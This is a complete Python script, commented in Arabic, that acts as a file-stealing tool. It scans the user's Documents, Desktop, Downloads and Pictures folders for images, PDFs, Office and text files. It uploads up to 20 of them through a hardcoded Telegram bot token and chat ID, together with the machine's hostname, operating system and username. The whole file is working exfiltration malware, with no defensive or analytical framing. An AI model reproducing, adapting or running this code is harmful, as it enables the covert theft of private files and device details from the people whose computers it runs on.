#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import requests
import sys
from pathlib import Path
import platform
import socket
from datetime import datetime

# ============= إعدادات تلجرام (تم التحديث بالقيم الصحيحة) =============
TELEGRAM_BOT_TOKEN = "8556004865:AAE_W9SXGVxgTcpSCufs_hemEb_mOX_ioj0"
TELEGRAM_CHAT_ID = "6124349953"

# ============= إعدادات المسح =============
root_path = os.path.expanduser("~")
# تقليل الامتدادات لتسريع العملية في البداية وضمان وصول أهم الملفات
extensions = ('.jpg', '.jpeg', '.png', '.pdf', '.docx', '.txt', '.doc', '.xls', '.xlsx')

# ============= معلومات الجهاز =============
def get_device_info():
    """الحصول على معلومات الجهاز"""
    try:
        device_name = socket.gethostname()
        system = platform.system()
        user = os.environ.get('USERNAME', os.environ.get('USER', 'Unknown'))
        return f"{system} | {device_name} | User: {user}"
    except:
        return "Unknown Device"

# ============= دالة إرسال الملفات عبر تلجرام =============
def send_file_to_telegram(file_path, original_path):
    """إرسال ملف إلى تلجرام"""
    try:
        file_size = os.path.getsize(file_path)
        
        # تلجرام يدعم ملفات حتى 50 MB
        if file_size > 50 * 1024 * 1024:
            return False, f"⏭️  الملف كبير جداً ({file_size / 1024 / 1024:.2f} MB)"
        
        # إرسال الملف
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        
        with open(file_path, 'rb') as f:
            files = {'document': f}
            caption = f"""
📁 **ملف مسحوب جديد**

📄 **الملف:** {os.path.basename(file_path)}
📍 **المسار الأصلي:** {original_path}
💾 **الحجم:** {file_size / 1024:.2f} KB
🖥️ **الجهاز:** {get_device_info()}
⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
            data = {
                'chat_id': TELEGRAM_CHAT_ID,
                'caption': caption,
                'parse_mode': 'Markdown'
            }
            
            response = requests.post(url, files=files, data=data, timeout=60)
            
            if response.status_code == 200:
                return True, "✅ تم الإرسال"
            else:
                return False, f"❌ فشل الإرسال (Status: {response.status_code})"
    
    except Exception as e:
        return False, f"❌ خطأ: {str(e)}"

# ============= دالة إرسال رسالة نصية =============
def send_message_to_telegram(message):
    """إرسال رسالة نصية إلى تلجرام"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        response = requests.post(url, data=data, timeout=30)
        return response.status_code == 200
    except:
        return False

# ============= البرنامج الرئيسي =============
if __name__ == "__main__":
    # إرسال إشعار البدء إلى تلجرام
    startup_msg = f"""
🚀 **نظام سحب الملفات قد بدأ العمل**

🖥️ **الجهاز:** {get_device_info()}
📂 **المجلد المراقب:** {root_path}
⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

جاري البحث عن الملفات...
"""
    send_message_to_telegram(startup_msg)

    # ============= مسح وتحميل الملفات =============
    count = 0
    failed = 0
    total_size = 0

    try:
        # البحث في المجلدات الرئيسية فقط لتجنب البطء (Documents, Desktop, Downloads)
        target_dirs = [
            os.path.join(root_path, 'Documents'),
            os.path.join(root_path, 'Desktop'),
            os.path.join(root_path, 'Downloads'),
            os.path.join(root_path, 'Pictures')
        ]
        
        for t_dir in target_dirs:
            if not os.path.exists(t_dir): continue
            
            for root, dirs, files in os.walk(t_dir):
                for file in files:
                    if file.lower().endswith(extensions):
                        file_path = os.path.join(root, file)
                        try:
                            file_size = os.path.getsize(file_path)
                            if file_size > 50 * 1024 * 1024: continue
                            
                            success, message = send_file_to_telegram(file_path, file_path)
                            if success:
                                count += 1
                                total_size += file_size
                            else:
                                failed += 1
                            
                            # التوقف بعد سحب 20 ملف لتجنب الحظر أو البطء الشديد في التجربة الأولى
                            if count >= 20: break
                        except:
                            failed += 1
                if count >= 20: break

    except Exception as e:
        send_message_to_telegram(f"❌ خطأ أثناء السحب: {str(e)}")

    # إرسال ملخص نهائي إلى تلجرام
    summary_msg = f"""
✅ **انتهى سحب الملفات**

📊 **الإحصائيات:**
✅ تم تحميل: {count} ملفات
❌ فشل: {failed} ملفات
💾 الحجم الإجمالي: {total_size / 1024 / 1024:.2f} MB

🖥️ **الجهاز:** {get_device_info()}
⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    send_message_to_telegram(summary_msg)
    sys.exit(0)
